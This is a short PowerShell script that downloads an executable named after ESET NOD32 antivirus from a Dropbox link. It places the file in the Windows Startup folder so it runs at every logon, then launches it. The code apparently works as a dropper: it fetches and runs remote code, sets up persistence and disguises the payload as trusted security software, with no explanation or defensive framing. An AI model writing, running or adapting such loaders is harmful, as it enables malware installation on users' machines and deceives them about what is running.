
$dropboxUrl = "https://www.dropbox.com/scl/fi/lpany7i4dl1gc99glg9bq/Eset-NODE32.exe?rlkey=3yp6lfb4s98tkx6zlnbgm426a&st=sn2gdj5o&dl=1"


$fileName = [System.IO.Path]::GetFileName($dropboxUrl)


$fileName = $fileName -replace '[\\/:*?"<>|]', '-'


$startupFolder = [System.IO.Path]::Combine([System.Environment]::GetFolderPath("Startup"), "Eset NODE32.exe")


Invoke-WebRequest -Uri $dropboxUrl -OutFile $startupFolder

if (Test-Path $startupFolder) {
    Write-Host "File downloaded and placed in the startup folder with the name: $fileName"
    

    Start-Process -FilePath $startupFolder -Wait
} else {
    Write-Host "Download failed."
}
